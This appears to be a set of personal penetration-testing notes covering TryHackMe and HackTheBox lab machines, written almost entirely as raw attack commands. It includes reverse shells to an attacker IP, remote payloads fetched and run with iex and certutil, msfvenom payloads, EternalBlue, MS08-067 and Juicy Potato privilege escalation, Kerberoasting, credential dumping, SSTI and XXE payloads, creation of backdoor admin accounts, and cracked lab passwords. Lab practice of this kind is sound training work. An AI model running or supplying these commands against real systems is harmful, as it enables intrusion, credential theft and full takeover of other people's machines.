Get-ChildItem -Filter *interesting* -Recurse -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C: -Include *interesting-file.txt* -File -Recurse -ErrorAction SilentlyContinue
Get-Content interestingfile.txt.txt
	#find file hidden
Get-ChildItem -Path C:\ -Filter *.txt -Recurse -Force -ErrorAction SilentlyContinue | where { $_.Attributes -match “Hidden”}
	#count cmdlet in get-command
Get-Command | Where-Object commandtype -eq cmdlet | measure
Get-Command -CommandType cmdlet | measure
	#file hash
Get-FileHash '.\Program Files\interesting-file.txt.txt' -Algorithm md5
	#powershell pwd
Get-Location
	#powershell base64
Get-ChildItem -Include *b64.txt* -recurse -file
certutil -decode .\Users\Administrator\Desktop\b64.txt file.txt
Get-Content file.txt
	##enumerate /w powershell
Get-LocalUser
Get-User
Get-ADUser
	#user with SID
(Get-Command Get-LocalUser).Parameters
Get-LocalUser -SID "S-1-5-21-1394777289-3961777894-1791813945-501"
	#user that required password is false
Get-LocalUser | Get-Member
Get-LocalUser | Where-object PasswordRequired -Match false
	#local group
Get-Localgroup | measure
	#ipaddress
Get-NetIpAddress
Get-NetIpAddress | select ipaddress
	#port open
Get-NetTCPConnection | Where-Object -Property State -Match Listen | measure
Get-NetTCPConnection | Where-Object State -Match Listen | measure
	#applied patch
Get-HotFix
get-hotfix | where-object hotfixid -match KB4023834
Get-Hotfix -Id KB4023834
	#find backup file
get-childitem -include *.bak* -recurse -erroraction silentlycontinue | get-content
	#find string file
get-childitem -recurse -erroraction silentlycontinue | select-string -pattern API_KEY
	#scheduled task
get-scheduledtask
	#find owner directory/file
Get-Acl C:\
Get-Acl file.txt
	##ps1 scripting
	#find string in each file
Get-ChildItem -Path C:\Users\Administrator\Desktop\emails -recurse |
Where-object {$.Attributes -ne "Directory"} |
ForEach-Object {
If (Get-Content $_.FullName | Select-String password) {echo $_.FullName}}
	#another script
$path = "C:\Users\Administrator\Desktop\emails\*"
$string_pattern = "password"
$command = Get-ChildItem -Path $path -Recurse | 
Select-String -Pattern $String_pattern
echo $command
	#oneliner script
Get-ChildItem -recurse | Select-String -pattern password
Get-ChildItem -recurse -erroraction silentlycontinue | Select-String -pattern password
	##simple portscan powershell
for ($i=130; $i -le 140; $i++){
	Test-NetConnection localhost -Port $i }
	##show hidden file
Get-ChildItem -Force
	##check permission
icacls C:\Important
	##set permission
icacls C:\Importatnt /setowner Users



Corp Tryhackme
===================================
	##bypass applocker
	#whitelisting directory C:\Windows\System32\spool\drivers\color
>C:\Windows\System32\spool\drivers\color\shell.exe
	#history powershell
>Get-Content C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
	#kerbeoasting extract account /w spn
>setspn -T medin -Q ​ */*
	#kerberoasting /w powershell
>iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
>Invoke-Kerberoast -OutputFormat hashcat ​| fl
hashcat -m 13100 -​a 0 hash.txt /opt/rockyou.txt --force
john --format=krb5tgs --wordlist=/opt/rockyou.txt hash.txt
xfreerdp /u:fela /d:corp /p:rubenF124 /v:10.10.230.87 /cert:ignore
>iex (new-object net.webclient).downloadstring('http://10.4.11.80/flagstr')
nc -lvp 80
	#privesc
>powershell
>Invoke-WebRequest -Uri 'http://10.4.11.80/PowerUp.ps1' -OutFile 'powerup.ps1'
>. .\powerup.ps1
>Invoke-AllChecks
>get content C:\Windows\Panther\Unattend\Unattended.xml
	#got base64 credz
>Invoke-WebRequest -Uri 'http://10.4.11.80/base64' -OutFile 'asd.txt'
	#got credz administrator:tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
evil-winrm -i 10.10.230.87 -u 'administrator' -p 'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' 





Mr Robot Tryhackme
========================================
python3 autorecon.py 10.10.149.120
http://10.10.149.120/robots.txt
wget http://10.10.149.120/fsocity.dic
wc fsocity.dic
cat fsocity.dic | sort -u | wc
cat fsocity.dic | sort -u > pass.txt
wpscan --url http://10.10.149.120/ -U elliot -P pass.txt --password-attack wp-login
	#got credz elliot:ER28-0652
	#reverse shell php
exec bash --login
nc -lvp 4242
>python -c 'import pty;pty.spawn("/bin/bash")'
>cat /home/robot/password.raw-md5
	#crack md5 hashcat
hashcat -m 0 -a 0 password.raw-md5 /opt/rockyou.txt
	#got credz robot:abcdefghijklmnopqrstuvwxyz
>su robot
>bash linpeas.sh | tee linpeas-robot.txt
>find / -perm -4000 -type f 2>/dev/null
	#nmap privesc
>nmap --interactive
>!sh
#id









Retro Tryhackme
========================================
	#find OS
nmap -O -p80 10.10.141.32 -Pn
python3 autorecon.py 10.10.141.32
gobuster dir -u http://10.10.141.32/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
wpscan --url http://10.10.141.32/retro/ -e u,vp,vt,cb
	#find comment and got credz Wade:parzival
	#windows php rev shell: https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php
change template to rev shell > http://10.10.141.32/retro/wp-content/themes/twentyseventeen/404.php
rlwrap nc -lvp 4242
>whoami /all
	#seimpoersonateprivilege enabled
	##juicypotato privesc
>cd C:\Users\Public
>certutil -urlcache -split -f http://10.4.11.80/JuicyPotato.exe j.exe
>j.exe
>certutil -urlcache -split -f http://10.4.11.80/nc.exe nc.exe
>j.exe -t * -l 1337 -p cmd.exe -a "/c c:\users\public\nc.exe -e cmd.exe 10.4.11.80 4141"
nc -lvp 4141
>whoami
xfreerdp /u:Wade /v:10.10.141.32 /d:retro /p:parzival /cert:ignore
	##CVE-2019-1388 abuse UAC windows certificate
	#https://github.com/jas502n/CVE-2019-1388
	#https://www.youtube.com/watch?v=RW5l6dQ8H-8
wget https://github.com/jas502n/CVE-2019-1388/raw/master/HHUPD.EXE
>certutil -urlcache -split -f http://10.4.11.80/HHUPD.EXE HHUPD.exe
>run HHUPD.exe as Administrator > show more detail > show publisher certificate > 
	click issued by ... > browser IE > file > save page as > change path to  C:\Windows\System32.cmd.exe > cmd poped up
>whoami
	##kernel exploit windows server 2016 CVE-2017-0213
	#https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213
wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/CVE-2017-0213/CVE-2017-0213_x64.zip
unzip CVE-2017-0213_x64.zip
>certutil -urlcache -split -f http://10.4.11.80/CVE-2017-0213_x64.exe asd.exe
	#need rdp access
>asd.exe
	#new cmd poped up with system privilege
	##windows exploit suggester error
	#error accured when query to windows server 2016
add 2016 in line 959 on osnamearray
	["2012","2012"],
	["2016","2016"],
	["8.1","8.1"],
	##how to find kernel exploit
>systeminfo
search google microsoft windows server 2016 standard build "14393"
open microsoft website windows release info
search "14393" and find tab availability
got date 10/15/2016
go to payloadallthethings swisskyrepo
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
find "kernel"
list 2016
check CVE date release






TonyTheTiger Tryhackme
=====================================
nmap -O -p80 10.10.141.32 -Pn
python3 autorecon.py 10.10.18.13
http://10.10.18.13:8080
http://10.10.18.13:8080/admin-console
	#login jboss with default credential
	#admin:admin
	##CVE-2015-7501
	##exploit Jboss AS 6 Deserialization of Untrusted Data
unzip jboss.zip
python exploit.py 10.10.18.13:8080 'ping 10.4.11.80 -c 1'
sudo tcpdump tun0 icmp
	#got RCE
python exploit.py 10.10.18.13:8080 'nc -e /bin/bash 10.4.11.80 4242'
nc -lvp 4242
>python -c 'import pty;pty.spawn("/bin/bash")'
>cat /home/jboss/note
	#got credz jboss:likeaboss
>su jboss
>sudo -l
	#(ALL) NOPASSWD: /usr/bin/find
	##find privec
>sudo find . -exec /bin/bash \; -quit
#cat /root/root.txt
echo QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y== | base64 -d | hashid
	#found md5 hash
hashcat -m 0 -a 0 asd /opt/rockyou.txt
	##another working exploit java deserialization
git clone https://github.com/joaomatosf/jexboss.git
cd jexboss
pip install -r requires.txt
python3 jexboss.py -u http://10.10.18.13:8080






Ghostcat Tryhackme
====================================
nmap -O -p80 10.10.111.97 -Pn
ping 10.10.111.97
john --format=gpg --wordlist=/opt/rockyou.txt hash.txt
python3 autorecon.py 10.10.111.97
http://10.10.111.97:8080
	#tomcat 9.0.30
	#CVE-2020-1938 tomcat AJP ghostcat file inclution
	#find ajp port (default 8009)
nmap -p 8009 10.10.111.97
wget https://github.com/00theway/Ghostcat-CNVD-2020-10487
python3 ajpShooter.py http://10.10.111.97 8009 /WEB-INF/web.xml read
	#got credz skyfuck:8730281lkjlkjdqlksalks
ssh skyfuck@10.10.111.97
	#decrypt pgp gpg file
>gpg --import tryhackme.asc
>gpg --decrypt credential.pgp
>gpg --decrypt --no-use-agent credential.pgp
	#need password, crack .asc file with john
gpg2john tryhackme.asc > hash.txt
john --format=gpg --wordlist=/opt/rockyou.txt hash.txt
	#got credz merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
>su merlin
>sudo -l
	(root : root) NOPASSWD: /usr/bin/zip
	#zip privesc
>zip $TF(mktemp -u)
>sudo zip $TF /etc/hosts -T -TT 'sh #'
#id
#rm $TF
	#zip privesc
>sudo zip mktemp -u /tmp -T -TT 'sh #'








BluePrint Tryhackme
=======================================
sudo autorecon 10.10.9.12
http://10.10.9.12:8080/
http://10.10.9.12:8080/oscommerce-2.3.4/catalog/
	#oscommerece 2.3.4
searchsploit oscommerece 2.3
	#exploit oscommerce 2.3 rce
	#installation data exist and abused got rce
searchsploit -m 50128
python3 50128.py http://10.10.9.12:8080/oscommerce-2.3.4/catalog/
>whoami
	#pwd windows show current dirrectory
>echo %cd%
>certutil -urlcache -split -f http://10.4.11.80/shell.php C:\xampp\htdocs\oscommerce-2.3.4\catalog\shell2.php
http://10.10.9.12:8080/oscommerce-2.3.4/catalog/shell.php
	#p0wny shell work on windows
>certutil -urlcache -split -f http://10.4.11.80/nc.exe C:\users\administrator\desktop\nc.exe
	#windows nc reverse shell
>nc.exe -e cmd.exe 10.4.11.80 4242
rlwrap nc -lvp 4242
>whoami
	#add user windows
>net user username password /add
>net user tai tai /add
	#add user to administrator
>net localgroup administrators tai /add
	#extract ntlm hash dump ntlm hash
	#https://www.hackingarticles.in/credential-dumping-ntds-dit/
locate fgdump
>certutil -urlcache -split -f http://10.4.11.80/fgdump.exe C:\users\administrator\desktop\fgdump.exe
>fgdump.exe
	#got credz ab:1000:NO PASSWORD*********************:30E87BF999828446A1C1209DDDE4C450:::









Ignite Tryhackme
=======================================
sudo autorecon.py 10.10.117.82
http://10.10.117.82/fuel
	##exploit fuel cms 1.4 RCE
searchsploit fuel cms 1.4
searchsploit -m 47138
	#change url
python 47138.py
>id
>wget 10.4.11.80/shell.php
	#fuel cms config file
	#~/fuel/application/config/
>cat /var/www/html/fuel/application/config/config.php
>cat /var/www/html/fuel/application/config/database.php
	#got mysql credz root:mememe
>su root
password: mememe
#id









Source Tryhackme
==========================================
sudo autorecon 10.10.134.226
	#webmin
https://10.10.134.226:10000
	#wfuzz error pycurl
git clone https://github.com/pycurl/pycurl
cd pycurl
sudo apt-get install libssl-dev
sudo python3 setup.py install
wfuzz -h
	#no error and can request https
	#wfuzz filter size
wfuzz -c -w /usr/.../directory-list-2.3-small.txt --hc 404 --hh 3727 https://10.10.134.226:10000/FUZZ.txt
cat tcp_10000_http_nmap.txt
	#miniserv 1.890 (webmin httpd)
	#enumerate webmin version from nmap
searchsploit webmin
	##CVE-2019-15107 webmin backdoor rce password_change.cgi
	#use metasploit
msfconsole
>search webmin
>use exploit/linux/http/webmin_backdoor
>set rhosts 10.10.134.226 set lhost 10.4.11.80
>set ssl true
>run
#id
	#stable reverse shell
#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.11.80 4141 >/tmp/f
nc -lvp 4141
	##CVE-2019-15107 without metasploit
wget https://github.com/MuirlandOracle/CVE-2019-15107
python3 CVE-2019-15107.py -h
python3 CVE-2019-15107.py -s 10.10.134.226
	#based on this https://medium.com/@knownsec404team/backdoor-exploration-of-webmin-remote-code-execution-vulnerabilities-cve-2019-15107-55234c0bd486
	#webmin vulnerable at version 1.930<1.920-1.910-1.900-1.890<=1.880









IntroToShell Tryhackme
============================================
	##socat windows
git clone https://github.com/StudioEtrange/socat-windows
cd socat-windows
zip -q asd.zip *
python -m SimpleHTTPServer 80
>certutil -urlcache -split -f http://10.4.11.80/asd.zip asd.zip
	#unzip windows
>tar -xf asd.zip
>socat.exe -h
	##windows socat reverse shell
>socat.exe -d -d TCP:10.4.11.80:4141 EXEC:cmd.exe,pipes,pty
socat - tcp4-listen:4141
>socat.exe -d -d TCP:10.4.11.80:4141 EXEC:powershell.exe,pipes
nc -lvp 4141
	#windows socat bind shell
>socat TCP-L:4242 EXEC:powershell.exe,pipes
socat -d -d -d - TCP4:10.10.238.13:4141
nc 10.10.238.13 4141


Anthem Tryhackme
======================================
sudo autorecon 10.10.191.50
http://10.10.191.50/robots.txt
	#got pass UmbracoIsTheBest!
		#enumerate user on website
hydra -t 1 -V -f -L user.txt -p UmbracoIsTheBest! rdp://10.10.191.50
	#got rdp success SG:UmbracoIsTheBest!
xfreerdp /u:sg /p:UmbracoIsTheBest! /cert:ignore /v:10.10.232.218
	#password in hidden file
	#show history explorer
run -> recent -> there is backup directory
cd C:\
dir /a
get-childitem -force
	#search hidden directory
Get-ChildItem -Recurse -Force -ErrorAction SilentlyContinue -Attributes Directory | where { $_.Attributes -match "Hidden"}
Get-ChildItem -Recurse -Force -ErrorAction SilentlyContinue -Attributes !Directory | where { $_.Attributes -match "Hidden"}
cd c:\backup
type restore.txt
	access denied
right click -> properties -> add owner
	#got possible password ChangeMeBaby1MoreTime
runas /noprofile /user:administrator cmd.exe








Zthobscurewebvulns Tryhackme
======================================
	##SSTI
payload = {{7*7}}
SSTI Jinja
	#read file
{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}}
	#OS command
{{+self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()+}}
	#rev shell
{{+self._TemplateReference__context.cycler.__init__.__globals__.os.popen('wget 10.4.11.80/rev.sh').read()+}}
{{+self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash rev.sh').read()+}}
nc -lvp 4242
	#auto ssti
git clone https://github.com/epinna/tplmap
sudo pip install -r req.txt
python tplmap.py -h
python tplmap.py -u 'http://10.10.26.33/' -d 'name'
python tplmap.py -u 'http://10.10.26.33/' -d 'name' --os-cmd id

	##Json Web Token JWT
header.payload.secret
header
	{"typ":"JWT","alg":"RS256"}
	#change using HS256 new-header
	{"typ":"JWT","alg":"HS256"}
	#change to hex public key
cat public.pem | xxd -p | tr -d "\\n" > asd
	#encrypt header.payload
echo -n "header.payload" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$asd
	#got valid HS256 key
	#create secret with HS256 key
python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$HS256key')).replace('=','')\")"
	#got new-secret
	#new JWT 
new-header.payload.new-secret
	##abuse JWT none algorithm
header.payload.secret
header
	{"typ":"JWT","alg":"RS256"}
	#change algorithm to none
	{"typ":"JWT","alg":"none"}
	#new JWT
new-header.new-payload.
	#bruteforce JWT
git clone https://github.com/brendan-rius/c-jwt-cracker
sudo make
./jwtcracker token abcdefghijklmnopqrstuvwxyz 4

	##XXE
intercept burp
every request with XML format and echo back XML data could be XXE
<?xml version="1.0"?>
...
<email>asdasd</email>
...
	#data <email> asdasd are echoed back
	#injection
<?xml version="1.0"?>
<!DOCTYPE email [<!ELEMENT email ANY>
<!ENTITY xxe SYSTEM 'file:///etc/passwd'>
]>
...
<email>&xxe;</email>
...
	#retreived data /etc/passwd
	#XXE RCE with expect module
...
<!ENTITY xxe SYSTEM 'expect://id'>
...
	#expect module not installed by default





Ice Tryhackme
======================================
sudo autorecon 10.10.2.196
nmap -p 8000 -sV 10.10.2.196
	#exploit ice streaming media server
msfconsole
search icecast
use exploit/windows/http/icecast_header
set rhost 10.10.2.196 lport 8000 lhost 10.4.11.80 lport 4242
run
>getuid
>run post/multi/recon/local_exploit_suggester
	#bypass UAC eventvwr privesc
>background
>use exploit/windows/local/bypassuac_eventvwr
>set session 1 lhost 10.4.11.80 lport 4141
>run
>getuid
	#still current user
>getprivs
	#current user are now in administrators group
	#migrate to get system user
>ps
>migrate -N spoolsv.exe
>getuid
	NT AUTHORITY\SYSTEM
	#mimikatz metasploit known as kiwi
>load kiwi
>help
>creds_all
>dcsync_ntlm
>screenshare






Ice Tryhackme Without Metasploit
=======================================
wget https://github.com/ivanitlearning/CVE-2004-1561/blob/master/568-edit.c
	#create payload in C
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.4.11.80 LPORT=4242 -b '\x0a\x0d\x00' -f c
gcc 568-eidt.c -o 568
./568 10.100.162.85
rlwrap nc -lvp 4242
>whoami
>systeminfo
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2021-08-25-mssb.xls --systeminfo systeminfo-ice.txt
	#exploit MS14-058 CVE-2014-4113
	#Microsoft Windows 7 Professional
	#6.1.7601 service Pack 1 Build 7601
	#hitfix KB2534111 KB976902
wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-058/CVE-2014-4113-Exploit.rar
unrar e CVE-2014-4113-Exploit.rar
>certutil -urlcache -split -f http://10.4.11.80/Wind64.exe
>Win64.exe whoami
>ex.exe shell.exe
	##eternalblue
python eternal_checker.py 10.10.210.191
cd shellcode && ./shell_prep.sh
nc -lvp 4444
nc -lvp 5555
cd shellcode && ./shell_prep.sh
python eternalblue_exploit7.py 10.10.210.191 shellcode/sc_all.bin






Legacy HTB
=======================================
sudo autorecon 10.10.10.4
cat enum4linux.txt
	#OS version Windows XP Proffesional SP3
	#google search 'exploit eternalblue windows XP'
	#exploit ms08-067 metasploit
msfconsole
search ms08-067
info exploit/windows/smb/ms08_067_netapi
use exploit/windows/smb/ms08_067_netapi
set rhost 10.10.10.4
set lport 10.10.14.6
set lport 9898
run
>getuid
	NT AUTHORITY\SYSTEM
	#manual exploit ms08-067
wget https://github.com/areyou1or0/OSCP/blob/master/Scripts%20-%20MS08-067
python ms08-06.py
nano ms08-067.py
	#change payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
python ms08-067.py 10.10.10.4 6 445
nc -lvp 4321
>whoami
impacket-smbserver asd .
>copy \\10.10.14.6\asd\whoami.exe .
>whoami
	NT AUTHORITY\SYSTEM
>type "C:\Documents and Settings\Administrator\Desktop\root.txt"








Devel HTB
=====================================
sudo autorecon 10.10.10.5
	#reverse shell aspx
wget wget https://github.com/borjmz/aspx-reverse-shell/raw/master/shell.aspx
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4242 -f aspx -o shell.aspx
ftp 10.10.10.5
>dir
	#transfer binary ftp binary
>binary
	200 set type to I
>put shell.aspx
rlwrap nc -lvp 4321
http://10.10.10.5/shell.aspx
>whoami
	#iss apppool/web
>systeminfo
	Microsoft Windows 7 Enterprise
	6.1.7600 N/A Build 7600
>whoami /priv
	#juicy potato seimpersonateprivilege pirvesc
wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe > rshell.exe
>copy \\10.10.14.6\ads\jpx86.exe .
>copy \\10.10.14.6\ads\rshell.exe .
>jpx86.exe
>jpx86.exe -t * -l 1337 -p rshell.exe
	#got error maybe because CLSID
	#source to find CLSID
	#https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise/
	#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
>jpx86.exe -t * -l 1337 -p rshell.exe -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
rlwrap nc -lvp 4444
>whoami
	NT AUTHORITY\SYSTEM
	#another privesc ms11-046
wget https://github.com/am0nsec/exploit/raw/master/windows/privs/MS11-046/ms11-046.c
i686-w64-mingw32-gcc MS11-046.c -o ex.exe -lws2_32
	#error compile 32bit
sudo apt-get install mingw-w64
i686-w64-mingw32-gcc MS11-046.c -o ex.exe -lws2_32
ftp 10.10.10.5
>binary
>put ex.exe
>cd inetpub\wwwroot
>ex.exe
>whoami
	nt authority\system






Blue Hackthebox
======================================
sudo autorecon 10.10.10.40
	#eternalblue exploit ms17-10
msfconsole
>search eternalblue
>use exploit/windows/smb/ms17_010_eternalblue
>set lhost 10.10.14.6 set lport 9898 set rhost 10.10.10.40
>run
>getuid
	NT AUTHORITY\SYSTEM
	#eternalblue without metasploit
	#Microsoft Windows 7 Professional
	#6.1.7601 Service Pack 1 Build 7601
searchsploit eternalblue
searchsploit -m 42315
nano 42315.py
	#change username to "//" because default configuration
	#change def smb_pwn
	#mark print pwned.txt and change into this:
		smb_send_file(smbConn, 'rshell.exe', 'C', '/rshell.exe')
		service_exec(conn, r'c:\rshell.exe')
python 42315.py
	#got error MYSMB
	#download and add to same directory
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
python 42315.py
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 -f exe > rshell.exe
python 42315.py 10.10.10.40
rlwrap nc -lvp 4321
>whoami
	nt authority\system





Optimum Hackthebox
====================================
sudo autorecon 10.10.10.8
http://10.10.10.80
	#http file server 2.3
searhsploit http file server 2.3
searchsploit -m 49584
	#exploit rejetto hfs 2.3
python3 49584.py
nc -lvp 4242
>whoami
	optimum\kostas
>systeminfo > systeminfo-optimum.txt
python windows-exploit-suggester.py --database 2021-08-27-mssb.xls --systeminfo systeminfo-optimum.txt
	#exploit ms16-032 privesc
	#Microsoft Windows Server 2012 R2 Standard
	#6.3.9600 N/A Build 9600
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4141 -f exe > exp.exe
>copy \\10.10.14.6\asd\exp.exe
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.6 lport 4141
run
>./exp.exe
>getuid
	optimum/kostas
>run post/mlti/recon/local_exploit_suggester
>backgroud
use exploit/windows/local/bypassuac_eventvwr
set session 1 lhost 10.10.14.6 lport 1414
run
>getuid
	NT AUTHORITY\SYSTEM
	#privsc without metasploit
python windows-exploit-suggester.py --database 2021-08-27-mssb.xls --systeminfo systeminfo-optimum.txt
	#try every suggester
	#exploit ms16-098
	#Microsoft Windows Server 2012 R2 Standard
	#6.3.9600 N/A Build 9600
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
>copy \\10.10.14.6\asd\41020.exe
>41020.exe
>whoami
	nt authority\system










Bastard HTB
=====================================
sudo autorecon 10.10.10.9
http;//10.10.10.9
http;//10.10.10.9/robots.txt
http://10.10.10.9/CHANGELOG.txt
	#Drupal 7.54, 2017-02-01
searchsploit drupal 7.5
	#exploit drupalgeddon2
wget https://github.com/PolarisLab/Drupal-Exploit/raw/master/Drupal-Exploit.php
	#php server web buildin
php -S 0.0.0.0:8888
http://localhost:8888/Drupal-Exploit.php
	#fail
wget https://github.com/dreadlocked/Drupalgeddon2
ruby drupalgeddon2.rb
	#error cannot load such file -- highline/import
sudo gem install highline
./drupalgeddon2.rb http://10.10.10.9/
>whoami
	nt authority\iusr
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 -f exe > rshell.exe
>copy \\10.10.14.6\asd\rshell.exe
>rshell.exe
rlwrap nc -lvp 4321
>whoami /priv
	#SeImpersonatePrivilege privesc 
	#Microsoft Windows Server 2008 R2 Datacenter
	#6.1.7600 N/A Build 7600
>copy \\10.10.14.6\asd\JuicyPotato.exe potato.exe
>potato.exe -h
>potato.exe -t * -l 1337 -p rshell.exe .
	#error CLSID
	#CLSID Windows Server 2008 R2 Enterprise
	#https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/
>potato.exe -t * -l 1337 -p rshell.exe -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
rlwrap nc -lvp 4321
>whoami
	nt authority\system
	#another privesc kernel exploit
	#MS15-051
	#Microsoft Windows Server 2008 R2 Datacenter
	#6.1.7600 N/A Build 7600
https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip
unzip MS15-051-KB3045171.zip
>copy \\10.10.14.6\asd\ms15-051x64.exe
>ms15-051x64.exe whoami
	nt authority\system










Granny Hackthebox
=======================================
sudo autorecon 10.10.10.15
cat tcp_80_nikto.txt
	#put method allowed
	#put curl proxy
curl -T asd.txt http://10.10.10.15/ -x http://127.0.0.1:8080
	203 found
	#IIS 6.0
	#webdav buffer overflow
wget https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell -O iisrev.py
iisrev.py 10.10.10.15 80 10.10.14.6 4321
rlwrap nc -lvp 4321
>whoami
	nt authority\network service
>cd c:\
>mkdir temp
>cd temp
>systeminfo
	#kernel ms08-066 privesc
	#Microsoft(R) Windows(R) Server 2003, Standard Edition x86
	#5.2.3790 Service Pack 2 Build 3790
wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS08-066/ms08066%E6%8F%90%E6%9D%83(XP%202003).zip -O ms08066.zip
unzip ms08066.zip
>copy \\10.10.14.6\asd\ms08066.exe
>ms08066.exe
	#got administrator shell
>type "c:\documents and settings\administrator\desktop\root.txt"
	#enumerate webdav
davtest -url http://10.10.10.15
	#only can upload .txt and .html file
	#method move enabled
	#webdav tool
cadaver http://10.10.10.15
>ls
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.6 lport=9090 -f aspx -o a.aspx
>put a.aspx
	403 Forbidden
>put a.txt
>move a.txt a.aspx
rlwrap nc -lvp 9090
curl http://10.10.10.14/a.aspx
>whoami
	nt authority\network service
>whoami /priv
	#privesc seimpersonateprivilege windows server 2003
	#Microsoft(R) Windows(R) Server 2003, Standard Edition x86
	#5.2.3790 Service Pack 2 Build 3790
wget https://github.com/Re4son/Churrasco/blob/master/churrasco.exe
>copy \\10.10.14.6\asd\churrasco.exe
>churrasco.exe
>churassco.exe whoami
>churrasco -d "cmd.exe"
>whoami
	#unstable shell
	#try to type exit magically work
>exit
>whoami
	nt authority\system
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.6 lport=9191 -f exe -o b.exe
>copy \\10.10.14.6\asd\b.exe
>churrasco -d "b.exe"
nc -lvp 9191
>whoami
	nt authority\system







Arctic Hackthebox
====================================
sudo autorecon 10.10.10.11
http://10.10.10.11:8500/
http://10.10.10.11:8500/CFIDE/administrator/
	#exploit adobe coldfusion 8
searchsploit adobe cold fusion 8
searchsploit -m 50057
nano 50057.py
	#change rhost rport lhost lport
python3 50057.py
>whoami
	arctic/tolis
>whoami /rpiv
	#seimpoersonateprivilege privesc
	#Microsoft Windows Server 2008 R2 Standard
	#6.1.7600 N/A Build 7600
>mkdir temp
cd c:\temp
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 -f exe > rshell.exe
>copy \\10.10.14.6\asd\rshell.exe
>copy \\10.10.14.6\asd\JuicyPotato.exe potato.exe
>potato.exe -h
>potato.exe -t * -l 1337 -p rshell.exe .
rlwrap nc -lvp 4321
>whoami
	nt authority\system
	#MS10-059 privesc
wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe
>copy \\10.10.14.6\asd\MS10-059.exe
>MS10-059.exe 10.10.14.6 4141
nc -lvp 4141
>whoami
	nt authority\system
wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/Churraskito_exe.zip
unzip Churraskito_exe.zip
>copy \\10.10.14.6\asd\Churraskito.exe
>Churraskito.exe "C:\windows\system32\cmd.exe" "net user tai tai /add"

	#set proxy exploit burp
proxy -> options -> add -> bind port '8500' -> 
request handling host '10.10.10.11' host '8500' -> ok
nano 50057.py
	#change rhost '127.0.0.1' rport lhost lport
python3 50057.py





Grandpa
======================================
Granny Hackthebox
=======================================
sudo autorecon 10.10.10.14
cat tcp_80_nikto.txt
	#put method allowed
	#put curl proxy
curl -T asd.txt http://10.10.10.14/ -x http://127.0.0.1:8080
	403 Forbidden
	#fail
davtest -url http://10.10.10.14
cadaver http://10.10.10.14
>ls
	#all dav tools fail
	#exploit iis 6.0
wget https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell -O iisrev.py
iisrev.py 10.10.10.14 80 10.10.14.6 4321
rlwrap nc -lvp 4321
>whoami
	nt authority\network service
>cd c:\
>mkdir temp
>cd temp
>systeminfo
	#kernel ms08-066 privesc
	#Microsoft(R) Windows(R) Server 2003, Standard Edition x86
	#5.2.3790 Service Pack 2 Build 3790
wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS08-066/ms08066%E6%8F%90%E6%9D%83(XP%202003).zip -O ms08066.zip
unzip ms08066.zip
>copy \\10.10.14.6\asd\ms08066.exe
>ms08066.exe
	#got administrator shell
>type "c:\documents and settings\administrator\desktop\root.txt"
	#another privesc
>whoami /priv
	#privesc seimpersonateprivilege windows server 2003
	#Microsoft(R) Windows(R) Server 2003, Standard Edition x86
	#5.2.3790 Service Pack 2 Build 3790
wget https://github.com/Re4son/Churrasco/blob/master/churrasco.exe
